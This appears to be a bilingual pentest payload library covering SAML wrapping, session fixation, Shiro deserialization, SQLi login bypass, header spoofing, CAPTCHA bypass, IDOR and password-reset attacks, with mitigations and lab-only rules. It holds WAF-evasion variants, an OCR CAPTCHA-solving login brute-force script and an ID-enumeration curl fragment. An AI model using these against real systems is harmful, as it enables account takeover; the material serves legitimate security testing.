description.en: Constructs XML Signature Wrapping variants that relocate the signature reference onto a malicious Assertion, exposing verifiers that trust document order or the first assertion node instead of resolving the signed reference.

subCategory.zh: SAML 断言与联邦身份攻击

overview.zh: 该 Payload 覆盖 SAML XML 签名包装验证基线场景，检验验证器在文档包含多个 Assertion 或 Signature 时是否只认引用对象。验证维度为模板签署与本地复验的单步基线，包装变体由 WAF 绕过区样例覆盖，对应第 1 步。
overview.en: This payload covers the SAML XML signature-wrapper validation baseline, testing whether the verifier honors only the referenced object when documents contain multiple Assertions or Signatures. Validation signs a template and re-verifies after tampering, mapped to step 1.

vulnerability.zh: 根因在于验证器按文档顺序或首个节点取断言而不核对签名引用：攻击者把合法签名挂在恶意 Assertion 上形成包装，验证通过后消费的却是伪造身份。
vulnerability.en: The root cause is selecting assertions by document order or first node without checking signature references: attackers attach a legitimate signature to a malicious Assertion as a wrapper, and after validation the forged identity is consumed.

exploitation.zh: 第 1 步按脚本用 xmlsec1 以测试 IdP 密钥签署模板生成 signed-test.xml，随后篡改其中 NameID 再复验并提交 ACS：复验失败或 ACS 拒绝即证明包装防护生效，验证通过且身份被替换即确认 XSW 缺陷。成功判据以复验结果与 ACS 决策为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, sign the template with xmlsec1 using the test IdP key to produce signed-test.xml, then tamper the NameID, re-verify, and submit to the ACS: failed re-verification or ACS rejection proves wrapper protection, while verified acceptance with a swapped identity confirms the XSW flaw. Judge success by re-verification results and ACS decisions. Replace placeholders via the global variables menu.

mitigation.zh:
验证器只消费签名引用 URI 命中的 Assertion，多个未引用断言即拒绝；校验 Subject 与 InResponseTo；SAML 库保持最新。
    # python3-saml 签名安全项
    'security': {'wantAssertionsSigned': True, 'wantResponseSigned': True}
    # 兜底：仅允许一个被签名的 Assertion
    ids = [a.get('ID') for a in
           tree.findall('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')]
    if len(ids) != 1 or '#' + ids[0] != sig_ref_uri:
        abort(400, 'XSW suspected')
mitigation.en: Parse the signature reference URI and consume only the covered Assertion, forbid unreferenced assertions in the document, and validate Subject and InResponseTo. After the fix, replay step 1: wrapper documents should be rejected.

name.zh: 会话固定与登录轮换

description.zh: 预置已知 Session ID 再完成登录，验证会话标识在认证成功后是否被服务端轮换。
description.en: Pre-sets a known session ID, completes login, and checks whether the server rotates the identifier on authentication; if the pre-auth cookie value survives login, whoever knows it inherits the authenticated session.

overview.zh: 该 Payload 覆盖会话固定与登录轮换场景，检验应用在认证成功后是否更换会话标识，防止攻击者以预置 ID 继承受害者已认证会话。验证维度为登录前后 Cookie 指纹对照单步执行，对应第 1 步。
overview.en: This payload covers session fixation and login rotation, testing whether the application rotates the session identifier after successful authentication so an attacker cannot inherit an authenticated session via a pre-set ID. Validation compares cookie fingerprints before and after login in one step, mapped to step 1.

vulnerability.zh: 根因在于登录成功后未轮换会话标识：预认证发放的 Cookie 值在认证后继续使用，知道该值的攻击者即可在受害者登录后直接复用同一会话。
vulnerability.en: The root cause is failure to rotate the session identifier on successful login: the pre-authentication cookie value keeps being used after authentication, so an attacker who knows it can reuse the same session once the victim logs in.

exploitation.zh: 第 1 步先以匿名请求获取登录前 Cookie 并计算其哈希，再用同一 Cookie 完成合成主体登录，登录后再次计算哈希并比较：两值不同即确认会话已轮换，相同则确认会话固定缺陷成立。成功判据以哈希对照与服务端会话记录为准。占位符在全局变量菜单替换为目标值；凭据仅使用合成测试账号。
exploitation.en: In step 1, obtain the pre-login cookie anonymously and hash it, then complete a synthetic login reusing the same cookie and hash it again; differing hashes confirm rotation, identical hashes confirm the fixation flaw. Judge success by hash comparison and server session records. Replace placeholders via the global variables menu; use only synthetic test credentials.

mitigation.en: Invoke the framework's session-regeneration routine on authentication state changes to force ID rotation and invalidate the old session immediately. After the fix, replay step 1: identifiers before and after login should differ completely and the old value must be unusable.

prerequisites.zh: 使用两个合成账户、隔离浏览器配置和固定无敏感字段标记对象，记录登录前后会话 ID 的哈希与主体。
prerequisites.en: Use two synthetic accounts, isolated browser profiles, and a fixed nonsensitive marker object, recording session-ID hashes and principals before and after login.

prerequisites.zh: 若检查明文传输，只在自有封闭网络和测试流量中抓包；Cookie 域、路径、SameSite 和浏览器版本必须明确。
prerequisites.en: If reviewing cleartext transport, capture only owned test traffic on an isolated network; document cookie domain, path, SameSite mode, and browser version.

analysis.zh: 阳性会话固定要求登录前受控会话 ID 在登录后未轮换且另一测试客户端可访问同一主体；Cookie Tossing 要求子域可设置的同名 Cookie 被主域安全逻辑选中；SameSite 仅证明凭据随导航发送，不能证明响应可读或状态变更。缺少属性、抓到测试 Cookie 或随机性工具给出低分本身都不是劫持。
analysis.en: Session fixation requires a controlled pre-login ID to survive authentication and authorize the same principal from another test client. Cookie tossing requires a same-name cookie set by a subdomain to be selected by main-domain security logic. SameSite can show credentials sent on navigation but not response readability or state change. A missing attribute, captured test cookie, or low randomness score alone is not hijacking.

opsecTips.zh: 仅复用可撤销的合成会话并读取一个标记对象；不得捕获第三方流量、真实 Cookie 或触发资金与资料变更。
opsecTips.en: Replay only revocable synthetic sessions and read one marker object; do not capture third-party traffic, real cookies, or trigger financial or profile changes.

opsecTips.zh: 注销全部测试会话，删除 Cookie、抓包和临时脚本，清理浏览器站点数据并恢复 HTTPS 与 Cookie 策略。
opsecTips.en: Log out all test sessions, delete cookies, captures, and temporary scripts, clear browser site data, and restore HTTPS and cookie policy.

description.zh: 绕过登录轮换缺失检测盲区：预置自定义会话 ID 完成登录后检查是否复用。成功判据：post.cookies 中 session 值仍为 ATTACKER_PRESET。
description.en: Tests missing rotation by pre-seeding a custom session ID across login and diffing the jar afterwards. Success: the session value remains ATTACKER_PRESET in post.cookies.

description.zh: 绕过仅接受 Cookie 头传递的假设：会话取自查询参数时同样可固定。成功判据：登录后响应携带同一 session 值。
description.en: Bypasses the assumption that sessions travel only via the Cookie header by seeding through the query string. Success: post-login response carries the same session value.

description.zh: 利用多 Cookie 头解析差异注入预置会话并观察取值优先级。成功判据：固定会话被服务端接受。
description.en: Exploits duplicate Cookie header parsing differences to seed a preset session. Success: the server accepts the fixed session.

description.zh: 会话标识经查询参数固定，登录后未轮换即成立。成功判据：登录后 Cookie 值仍为预设值。
description.en: Seeding the session id via query string; success if not rotated after login. Success: the cookie value stays at the preset after login.

description.zh: 多框架 Cookie 并存，任一未轮换即固定成功。成功判据：任一框架登录后复用预设值。
description.en: Multiple framework cookies coexist; any one not rotated means fixation. Success: any framework reuses the preset value after login.

description.zh: 编码值在解码层还原，绕过固定检测特征。成功判据：解码后预设会话被接受。
description.en: Encoded values resolve at the decode layer, evading fixation-detection signatures. Success: the decoded preset session is accepted.

name.zh: Shiro RememberMe 反序列化

description.zh: 用已知默认密钥构造加密的 Shiro RememberMe 值，验证反序列化边界（限授权实验环境）。
description.en: Forges an encrypted RememberMe value with the known default key (fixed key AES plus native Java deserialization in Shiro releases before the CBC-to-GCM hardening) and observes code execution at deserialization time in the authorized lab.

overview.zh: 该 Payload 覆盖 Shiro RememberMe 反序列化边界场景，检验畸形 rememberMe Cookie 是否被安全拒绝且不触发反序列化路径。验证维度为多大小写变体的畸形 Cookie 探测，对应第 1 步。
overview.en: This payload covers the Shiro RememberMe deserialization boundary, testing whether malformed rememberMe cookies are safely rejected without touching the deserialization path. Validation probes multiple case variants of malformed cookies, mapped to step 1.

vulnerability.zh: 根因在于旧版 Shiro 使用固定密钥的 AES 加密加 Java 原生反序列化还原记住我对象：攻击者构造恶意序列化载荷即可在解析时执行代码，畸形值则可能引发异常信息泄露。
vulnerability.en: The root cause is legacy Shiro decrypting rememberMe with a hardcoded AES key and restoring objects via native Java deserialization: crafted serialized payloads execute code during parsing, and malformed values may leak details through exceptions.

exploitation.zh: 第 1 步按脚本以多种大小写变体提交畸形 rememberMe Cookie 并观察响应差异：统一返回删除 Cookie 的重定向即证明解析失败关闭，出现反序列化特征报错或行为差异即记录为高危线索并转入专项验证。成功判据以响应与日志为准。占位符在全局变量菜单替换；探针载荷不含可执行内容。
exploitation.en: In step 1, submit malformed rememberMe cookies across case variants per the script and compare responses; a uniform delete-cookie redirect proves fail-closed parsing, while deserialization-style errors or behavioral differences should be logged as high-risk leads for specialized verification. Judge success by responses and logs. Replace placeholders via the global variables menu; probe payloads carry no executable content.

mitigation.zh:
升级 Shiro 至 1.11.x 以上并弃用默认/固定密钥：cipherKey 用本机随机 128bit（openssl rand -base64 16 生成），必要时关闭 rememberMe 改用服务端会话。
    # shiro.ini
    [main]
    rememberMeManager = org.apache.shiro.web.mgt.CookieRememberMeManager
    rememberMeManager.cipherKey = <openssl rand -base64 16 本机随机值>
    securityManager.rememberMeManager = $rememberMeManager
mitigation.en: Upgrade Shiro to a patched release with a fresh random key, and move remember-me to storage or signed structures that avoid native deserialization. After the fix, replay step 1: every malformed cookie should be uniformly rejected with no exception leakage.

description.zh: 为Shiro RememberMe 反序列化边界准备合成主体、固定只读标记和服务端日志基线。

prerequisites.zh: 使用可撤销的合成账户和隔离浏览器，记录 Remember-Me Cookie 的名称、属性、服务端令牌记录、设备会话和撤销事件。
prerequisites.en: Use a revocable synthetic account and isolated browser, recording remember-me cookie name, attributes, server token record, device sessions, and revocation events.

prerequisites.zh: Shiro 测试仅在确认版本、cipher mode、密钥配置和可销毁 Java 容器后进行，反序列化链替换为无进程本地 canary。
prerequisites.en: Test Shiro only after confirming version, cipher mode, key configuration, and a disposable Java container, replacing deserialization chains with a process-free local canary.

analysis.zh: 普通令牌缺陷要求修改或跨设备重放 Cookie 后建立错误主体，且服务端日志确认令牌未正确绑定、签名或撤销。Shiro 缺陷要求目标版本和密钥条件匹配，并由反序列化审计触发无害 canary；deleteMe 响应、Base64 可解码、序列化魔数、默认密钥在字典中或工具生成密文都不是 RCE 证据。
analysis.en: A normal token flaw requires a modified or replayed cookie to create the wrong principal with server logs confirming failed binding, integrity, or revocation. A Shiro flaw requires matching version and key conditions plus a harmless deserialization canary. A deleteMe response, Base64 decoding, serialization magic, a default key in a list, or tool-generated ciphertext is not RCE evidence.

opsecTips.zh: 仅访问一个只读标记对象；不得生成命令执行 gadget、外连回调、真实管理员 Cookie 或跨用户持久会话。
opsecTips.en: Access only one read-only marker object; do not generate command-execution gadgets, callbacks, real administrator cookies, or persistent cross-user sessions.

opsecTips.zh: 注销所有设备、撤销持久令牌并轮换测试密钥，删除 Cookie、序列化文件和工具输出，销毁 Java 容器。
opsecTips.en: Log out all devices, revoke persistent tokens and rotate test keys, delete cookies, serialized files, and tool output, and destroy the Java container.

description.zh: 绕过对明文 deleteMe 的 WAF 识别：编码形式仍触发 Shiro 异常路径确认指纹。成功判据：响应出现 Set-Cookie: rememberMe=deleteMe。
description.en: Bypasses WAFs flagging plaintext deleteMe while still triggering the Shiro exception path for fingerprinting. Success: response sets rememberMe=deleteMe.

description.zh: 利用重复 Cookie 头取值差异绕过单值检查。成功判据：第二个 rememberMe 触发解密错误栈。
description.en: Exploits duplicate-cookie extraction divergence to slip a second rememberMe value past single-value checks. Success: the second value triggers a decryption error stack.

description.zh: 多段值经容器拼接后还原完整密文，绕过长度与特征检查。成功判据：拼接值触发反序列化处理路径。
description.en: Multiple values concatenated by the container rebuild the ciphertext, bypassing length and signature checks. Success: concatenated value reaches the deserialization path.

name.zh: 登录 SQL 注入绕过

description.zh: 对登录表单提交引号、恒真条件与注释闭合变体，以差异响应或成功登录判定凭据是否被拼接进 SQL。
description.en: Submits quote-termination, tautology, and comment-closure variants to the login form and uses differential responses or an established session to prove credentials are concatenated into the WHERE clause, bypassing password verification.

subCategory.zh: 凭证注入与弱类型登录绕过

overview.zh: 该 Payload 覆盖 SQL 登录查询边界场景，检验登录接口的凭据拼接是否可被恒真条件与注释符改变查询语义。验证维度为经典 SQLi 登录绕过语句在合成主体下的执行，对应第 1 步。
overview.en: This payload covers the SQL login-query boundary, testing whether credential concatenation in the login flow can be altered by tautology conditions and comment markers. Validation executes classic SQLi login-bypass payloads against a synthetic principal, mapped to step 1.

vulnerability.zh: 根因在于登录 SQL 将用户输入直接拼进 WHERE 子句：攻击者用引号闭合凭据再注入 OR 恒真与注释符，查询即无条件命中，口令校验被绕过并直接建立会话。
vulnerability.en: The root cause is user input concatenated directly into the login WHERE clause: closing the credential with a quote and injecting an OR tautology plus a comment makes the query match unconditionally, bypassing password checks and establishing a session.

exploitation.zh: 第 1 步以合成主体在隔离环境执行 admin 加注释符与 OR 恒真两条样例并提交登录端点，返回已认证会话或跳转即确认查询边界失守，同时比对服务端 SQL 日志确认注入语句进入执行。成功判据以只读标记与会话证据为准。占位符在全局变量菜单替换为目标值；全部测试在书面授权范围内进行。
exploitation.en: In step 1, execute the two samples (quote-plus-comment and OR tautology) against the login endpoint as a synthetic principal in an isolated environment; an authenticated session or redirect confirms the query boundary is breached, and server SQL logs should show the injected statement executing. Judge success by the read-only marker and session evidence. Replace placeholders via the global variables menu; run all tests within written authorization.

mitigation.en: Switch login queries to parameterized binding, forbid string concatenation, and apply length and character allowlists to credential fields. After the fix, replay the step 1 samples: uniform authentication failure with no anomalous queries in logs.

prerequisites.zh: 准备未认证、普通用户和管理员三类合成主体，并为登录与受保护对象记录正常拒绝和允许基线。
prerequisites.en: Prepare synthetic unauthenticated, regular-user, and administrator principals and record normal deny and allow baselines for login and protected objects.

prerequisites.zh: 确认每个输入最终到达 SQL、MongoDB 查询、PHP 比较、反向代理还是应用路由，禁止跨解释器推断。
prerequisites.en: Identify whether each input reaches SQL, a MongoDB query, PHP comparison, a reverse proxy, or an application route; do not infer behavior across interpreters.

analysis.zh: 阳性证据是同一无权限主体仅改变一个输入后获得已认证主体或读取同一受保护对象，并由应用授权日志、数据库查询或代理到后端的规范化路径共同确认。登录页返回 200、错误文本变化、前端状态被修改、伪造头被回显、语法错误或不同路由返回公开内容都不是绕过证据。
analysis.en: Positive evidence requires the same unauthorized principal to gain an authenticated principal or read the same protected object after one input change, corroborated by authorization logs, database queries, or proxy-to-backend canonical paths. HTTP 200 on a login page, changed error text, client-side state edits, reflected spoofed headers, syntax errors, or public content from another route are not bypass evidence.

opsecTips.zh: 只读取一个不含敏感字段的固定标记对象；不得调用 DELETE、写入、管理员变更或真实账户操作。
opsecTips.en: Read only one fixed marker object without sensitive fields; do not invoke DELETE, writes, administrator changes, or real-account operations.

opsecTips.zh: 删除测试账户与标记对象，清空 Cookie 和代理缓存，恢复可信代理与统一规范化配置，并核对未产生状态变更。
opsecTips.en: Delete test accounts and marker objects, clear cookies and proxy caches, restore trusted-proxy and canonicalization settings, and verify that no state changed.

title.zh: 全量 URL 编码变形

description.zh: 绕过匹配明文 admin'/OR/'1'='1 特征的 WAF：将注入载荷全量百分号编码，传输层还原后进入 SQL 查询。成功判据：返回登录成功或与管理员登录一致的响应特征。
description.en: Bypasses WAFs matching plaintext admin'/OR signatures by fully percent-encoding the payload. Success: response matches a successful admin login.

description.zh: 绕过按整词匹配 OR/-- 的规则：用 MySQL 内联注释 /**/ 打散关键字，语义等价。成功判据：登录成功或 SQL 错误特征消失。
description.en: Bypasses whole-word OR/-- rules by breaking keywords with /**/ inline comments. Success: login succeeds or SQL error signature disappears.

description.zh: 绕过大小写敏感与空格特征规则：用 %09 制表符替代空格、LiKe 等价 =、数字免引号。成功判据：登录成功响应。
description.en: Bypasses case- and space-sensitive rules using %09 tabs, mixed case, and LiKe as = equivalent. Success: successful login response.

description.zh: 绕过一次解码后校验的 WAF/中间件链：双重百分号编码，第二次解码发生在应用层。成功判据：登录成功。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Bypasses WAF/middleware chains that validate after a single decode by double percent-encoding; the second decode happens at the app layer. Success: login succeeds. Failure condition: only works on architectures that run a second URL decode pass.

description.zh: 判据: 任一样例提交后出现已认证特征（登录成功跳转、发放新会话 Cookie 或与合法登录一致的响应）即为阳性；全部样例被统一拒绝、数据库日志显示语法错误或查询未命中行则为阴性。全程使用合成主体，并以服务端日志和只读标记留证。
description.en: Run this SQL Login Query Boundary sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

name.zh: 伪造客户端 IP 头认证绕过

description.zh: 伪造 X-Forwarded-For 等代理头，验证应用是否以可伪造的请求头做身份或内网信任判定。
description.en: Forges X-Forwarded-For and related proxy headers, verifying whether the application derives identity or intranet trust from request headers that any client can set when proxy trust is missing or overly broad.

overview.zh: 该 Payload 覆盖可信代理头认证边界场景，检验应用是否把客户端可伪造的 X-Forwarded-For 与 X-Original-URL 等头当作身份或路由依据。验证维度为转发头与内部路径覆盖头的组合样例，对应第 1 步。
overview.en: This payload covers the trusted-proxy-header authentication boundary, testing whether the app treats client-forgeable headers such as X-Forwarded-For and X-Original-URL as identity or routing inputs. Validation combines a forwarded-IP header with an internal-path override header, mapped to step 1.

vulnerability.zh: 根因在于代理信任配置过宽或缺失：应用把任意来源的代理头解析为可信元数据，攻击者直接注入头即可伪装内网来源或改写后端路由判定。
vulnerability.en: The root cause is overly broad or missing proxy trust configuration: the app parses proxy headers from any source as trusted metadata, so injected headers can spoof intranet origins or rewrite backend routing decisions.

exploitation.zh: 第 1 步以合成主体提交同时携带 X-Forwarded-For 指向 LAB_HOST 与 X-Original-URL 指向受保护 marker 路径的请求，观察服务端日志解析出的客户端地址与路由对象；访问控制被头值改变即确认信任边界失守。成功判据以服务端证据与只读标记为准。占位符在全局变量菜单替换；同时对比正常请求的解析结果以便留证。
exploitation.en: In step 1, submit a request as a synthetic principal carrying X-Forwarded-For set to LAB_HOST together with X-Original-URL pointing at the protected marker path, then inspect the client address and routing object parsed in server logs; any change in access control driven by header values confirms the trust boundary breach. Judge success by server-side evidence and the read-only marker. Replace placeholders via the global variables menu; compare against a normal request's parsed results for evidence.

mitigation.en: Strip override-class headers only at the directly adjacent edge proxy, configure trusted proxy CIDRs on the app, and drop such headers from unlisted sources. After the fix, replay step 1: forged headers should be stripped and routing resolved from the real request line.

prerequisites.en: Identify whether each input reaches SQL, a MongoDB query, PHP comparison, a reverse proxy, or an application route; do not infer behavior across interpreters.

analysis.zh: 阳性证据是同一无权限主体仅改变一个输入后获得已认证主体或读取同一受保护对象，并由应用授权日志、数据库查询或代理到后端的规范化路径共同确认。登录页返回 200、错误文本变化、前端状态被修改、伪造头被回显、语法错误或不同路由返回公开内容都不是绕过证据。
analysis.en: Positive evidence requires the same unauthorized principal to gain an authenticated principal or read the same protected object after one input change, corroborated by authorization logs, database queries, or proxy-to-backend canonical paths. HTTP 200 on a login page, changed error text, client-side state edits, reflected spoofed headers, syntax errors, or public content from another route are not bypass evidence.

opsecTips.zh: 只读取一个不含敏感字段的固定标记对象；不得调用 DELETE、写入、管理员变更或真实账户操作。

description.en: Bypasses defenses that sanitize only X-Forwarded-For by switching to synonymous headers like X-Real-IP/True-Client-IP. Success: authorization passes.

description.zh: 链式 XFF 伪造 — 绕过取末段 IP 或在链中扫描可信地址的校验逻辑：伪造多级代理链使末段为可信地址。成功判据：以可信身份访问成功。
description.en: Bypasses first-IP extraction by forging a multi-hop chain whose last entry is the trusted address. Success: access granted as trusted client.

description.zh: 轮换 CDN/代理专有头命中未被清洗的取值字段。成功判据：任一头使访问控制放行。

description.zh: 多级链形态使信任段（末位/首段）落入内网地址。成功判据：以内网身份通过。
description.en: Multi-hop chains place the trusted segment (first or last) on an internal address. Success: passes as an internal client.

name.zh: 验证码服务端消费验证

description.zh: 覆盖验证码服务端校验缺陷验证：从短信验证码响应泄露与重放登录，到验证码字段缺失/空值与万能验证码调试参数，并附 OCR 识别登录脚本，用于确认验证码是否真正在服务端强制校验。
description.en: Covers server-side captcha validation flaws: from SMS code response leakage and replay login through missing/empty captcha fields and universal-code debug parameters, with an OCR-recognition login script, confirming whether captchas are truly enforced server-side.

overview.zh: 该 Payload 覆盖验证码服务端强制校验场景，检验短信验证码是否泄露、可重放以及字段异常时的旁路。验证维度含响应泄露、重放登录、缺失空值与万能码调试参数四步，对应第 1 至第 4 步。
overview.en: This payload covers server-side captcha enforcement, testing whether SMS codes leak, replay, or bypass under field anomalies. Validation covers response leakage, replayed logins, missing or empty fields, and master codes plus debug parameters, mapped to steps 1 through 4.

vulnerability.zh: 根因在于验证码生成与校验逻辑的服务端约束缺失：验证码随响应回传、消费后不失效、缺失字段跳过校验、调试后门接受万能码，自动化攻击可完整走通登录。
vulnerability.en: The root cause is missing server-side constraints in generation and validation: codes echo back in responses, stay valid after consumption, missing fields skip checks, and debug backdoors accept master codes, letting automation complete login end to end.

exploitation.zh: 第 1 步请求发送短信接口并检查响应体、头与 Cookie 三处是否出现验证码明文；第 2 步以同一验证码连续提交两次登录，第二次成功即确认未消费；第 3 步提交缺失、空值与 null 的 captcha 字段观察是否跳过校验；第 4 步枚举常见弱验证码并以 debug 与 master_code 探测后门。任一步登录成功即确认缺陷。占位符在全局变量菜单替换。
exploitation.en: In step 1, call the SMS-send API checking body, headers and cookies for plaintext codes. In step 2, submit login twice with the same code; a second success confirms no consumption. In step 3, submit missing, empty and null captcha fields watching for skipped validation. In step 4, enumerate weak codes probing backdoors with debug flags and master_code. Login success at any step confirms the defect. Replace placeholders via the global variables menu.

mitigation.zh:
验证码仅服务端生成与存储并绑定会话，校验成功即原子失效；响应剥离验证码字段，入口强制字段 Schema，删除一切万能码后门。
    code = f'{secrets.randbelow(1000000):06d}'
    redis.setex(f'sms:{phone}', 300, code)             # 服务端存储
    stored = redis.execute_command('GETDEL', f'sms:{phone}')
    ok = stored is not None and compare_digest(stored.decode(), code)
mitigation.en: Generate and validate codes server-side only, consume once bound to the session, strip code fields from responses, and enforce field schemas at entry. After the fix, replay steps 1 through 4: every bypass should be rejected.

title.zh: 从响应中直接截获验证码

description.zh: 请求发送短信接口后检查响应体、X-Captcha-Code 头与 Cookie；验证码以明文字段、响应头或 Base64 Cookie 任一形式回传即可直接读取，无需等待短信。
description.en: After triggering the SMS endpoint inspect the body, X-Captcha-Code header and cookies; a code leaked in any of the three forms can be read instantly without the phone.

description.zh: 用截获的验证码连续提交两次登录请求；第二次仍返回成功即确认验证码消费后未失效，同一码值可以反复使用完成认证。
description.en: Submit the captured code twice in a row; a second success proves the code is never invalidated after consumption and can be reused at will.

title.zh: 异常字段绕过校验逻辑

description.zh: 分别提交缺少 captcha 字段、空字符串与 null 的登录请求；任一请求通过校验即利用服务端判空缺陷直连认证流程，绕过人机验证环节。
description.en: Submit logins with a missing captcha field, empty string and null; any request passing validation exploits null-check logic to reach authentication directly.

title.zh: 尝试万能码与调试后门
title.en: Try master codes and debug backdoors

description.zh: 枚举 000000、123456 等常见弱验证码，并携带 debug=true 与 master_code 提交；命中即发现隐藏的万能验证通道，任意账户可过码。
description.en: Enumerate weak codes such as 000000 and 123456 plus debug=true and master_code payloads; a hit reveals a hidden universal verification channel.

description.zh: 用 ddddocr 自动识别图形验证码并循环提交登录请求；识别能力叠加无频率限制即可规模化撞库，绕过验证码这道防线。
description.en: Auto-solve image captchas with ddddocr and loop login attempts; recognition plus absent rate limits turns the captcha into a speed bump for bulk credential stuffing.

attackChain.payload:
python3 - <<'PY'
import ddddocr
import requests

ocr = ddddocr.DdddOcr()
passwords = ["wrong-pass-1", "wrong-pass-2", "wrong-pass-3"]  # 授权测试口令清单

def solve_captcha(target):
    resp = requests.get(f"https://{target}/captcha/image")
    return ocr.classification(resp.content)

for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(
        f"https://{TARGET}/api/login",
        json={"user": "admin", "pass": pwd, "captcha": captcha},
    )
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
PY

analysis.zh: 验证码服务端消费验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Server-Side CAPTCHA Consumption Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

name.zh: 对象级授权跨账号验证

description.zh: 覆盖对象级授权（IDOR）的跨账号验证：从跨账号对象访问基线请求，到顺序 ID 枚举探测授权边界，再到管理接口角色篡改与重复/数组参数越权样例，并附 ID 编码边界值变体，用于确认越权访问是否成立。
description.en: Covers cross-account validation of broken object-level authorization (IDOR): from cross-account baseline requests through sequential ID enumeration probing the authorization boundary to admin-interface role tampering and duplicate/array parameter privilege samples, with ID-encoding boundary variants, confirming whether unauthorized access holds.

overview.zh: 该 Payload 覆盖对象级授权的跨账号验证场景，检验资源接口是否把对象访问绑定到当前主体。验证维度含跨账号基线、顺序 ID 枚举、管理接口与角色字段篡改、重复参数取值四步，对应第 1 至第 4 步。
overview.en: This payload covers object-level authorization via cross-account validation, testing whether resource APIs bind object access to the current principal. Validation covers a cross-account baseline, sequential ID enumeration, admin endpoints with role tampering, and duplicate-parameter resolution, mapped to steps 1 through 4.

vulnerability.zh: 根因在于控制器按 ID 直接取数而缺少归属校验，权限字段又接受客户端写入：对象编号可枚举、角色可篡改、参数取值顺序可控，越权链路完整成立。
vulnerability.en: The root cause is controllers fetching by ID without ownership checks while accepting client-written privilege fields: object IDs are enumerable, roles tamperable, and parameter resolution order controllable, completing the escalation chain.

exploitation.zh: 第 1 步以当前令牌请求用户 1001 的资料建立基线响应；第 2 步循环遍历相邻 ID 并记录状态码与响应大小，识别可越权区间；第 3 步用普通令牌访问管理列表接口，再向目标用户提交携带角色提升字段的 PUT；第 4 步以重复参数、重复 JSON 键与数组语法检测服务端取值顺序。任一步返回他人对象或接受提权即确认 IDOR。占位符在全局变量菜单替换；ID 边界值参考 wafBypass 清单。
exploitation.en: In step 1, request user 1001's profile with the current token to baseline the response. In step 2, loop adjacent IDs recording status codes and sizes to identify the accessible range. In step 3, hit the admin list endpoint with an ordinary token, then PUT the target user with privilege-elevating fields. In step 4, probe server-side resolution order with duplicate parameters, duplicate JSON keys and array syntax. Any step returning another user's object or accepting elevation confirms IDOR. Replace placeholders via the global variables menu; see wafBypass for ID boundary values.

mitigation.en: Enforce principal-ownership checks at every object access point, keep privilege fields server-managed, and unify error responses to remove enumeration signals. After the fix, replay steps 1 through 4: all cross-account requests should return 404 with audit logs.

title.zh: 建立自身对象的正常访问
title.en: Establish normal access to own object

description.zh: 以当前令牌请求用户 1001 的资料接口并记录响应结构与字段；接口正常返回即明确对象访问的请求形态，为后续越权比对提供参照。
description.en: Request user 1001's profile with the current token and record the response shape; a normal return defines the request form used as the reference for later cross-account attempts.

title.zh: 枚举相邻对象 ID 边界

-H "Authorization: Bearer {TOKEN}" \
"https://{TARGET}/api/users/$id/profile"

description.en: Hit /api/admin/users with the plain token and PUT role=admin on user 1001; a returned list or accepted privilege field confirms horizontal access plus vertical escalation.

name.zh: 密码重置令牌绑定验证

description.zh: 覆盖密码重置流程的令牌绑定验证：从 Host 头注入劫持重置链接，到四位验证码全遍历与响应操纵绕过，再到时间戳令牌离线预测，并附 Host 头混淆变体清单，用于确认重置令牌与账号的绑定强度。
description.en: Covers token-binding validation of password reset flows: from Host-header injection hijacking reset links through four-digit code enumeration and response-manipulation bypass to offline timestamp token prediction, with Host-header confusion variant lists, confirming how strongly reset tokens bind to accounts.

overview.zh: 该 Payload 覆盖密码重置流程的令牌绑定强度场景，检验链接派生、验证码、响应处理与令牌生成的四个薄弱环节。验证维度含 Host 注入、验证码遍历、响应操纵与时间戳令牌预测四步，对应第 1 至第 4 步。
overview.en: This payload covers token-binding strength across the password-reset flow, testing four weak links: link derivation, verification codes, response handling and token generation. Validation covers Host injection, code enumeration, response manipulation and timestamp-token prediction, mapped to steps 1 through 4.

vulnerability.zh: 根因在于流程各环节缺少服务端强约束：重置链接主机取自请求头、验证码无尝试上限、前端仅看响应状态放行、令牌由可预测的时间戳派生，任一环节失守即可接管账号。
vulnerability.en: The root cause is missing server-side constraints at each stage: reset-link hosts come from request headers, codes lack attempt caps, the frontend gates only on response status, and tokens derive from predictable timestamps, so any single weak link enables account takeover.

exploitation.zh: 第 1 步向重置接口注入恶意 Host 或 X-Forwarded-Host，观察生成链接是否指向注入域；第 2 步遍历 0000-9999 验证码，命中即输出并停止；第 3 步拦截失败响应改写为成功结构，检验前端是否直接放行；第 4 步按时间戳下划线用户名结构离线预测令牌。任一环节成功即确认对应缺陷。占位符在全局变量菜单替换；Host 变体参考 wafBypass。
exploitation.en: In step 1, inject a malicious Host or X-Forwarded-Host into the reset API and check whether links point at the injected domain. In step 2, enumerate codes 0000-9999, printing and stopping on a hit. In step 3, intercept the failure response rewritten as success to see whether the frontend proceeds. In step 4, predict tokens offline per the timestamp-underscore-username structure. Success at any stage confirms the defect. Replace placeholders via the global variables menu; see wafBypass for Host variants.

mitigation.zh:
重置链接域名服务端固定并忽略请求 Host 头；验证码限制尝试次数并绑定账号；令牌由 CSPRNG 生成，流程放行只认服务端状态。
    token = secrets.token_urlsafe(32)                  # 弃用时间戳派生
    redis.setex(f'pwreset:{token}', 600, uid)
    link = f'https://app.example.com/reset?token={token}'  # 域名固定
    if redis.incr(f'pwtries:{uid}') > 5: abort(429)    # 限次
mitigation.en: Pin link domains server-side, cap code attempts bound to the account, gate flow progress only on server state, and generate tokens with a CSPRNG. After the fix, replay steps 1 through 4: every stage must fail closed.

title.zh: 劫持重置邮件的链接域名

description.zh: 向密码重置接口注入 X-Forwarded-Host 指向攻击者域名；生成的重置链接指向攻击者服务器，受害者点击后重置 token 落入手中即完成链接劫持。
description.en: Inject X-Forwarded-Host pointing at the attacker domain into the reset request; when the mailed link targets the attacker server, the victim's click hands over the reset token.

description.zh: 循环提交 0000 至 9999 全部四位验证码并监测响应；接口无尝试次数限制时命中 success 即接管验证环节，拿到修改密码的通行证。
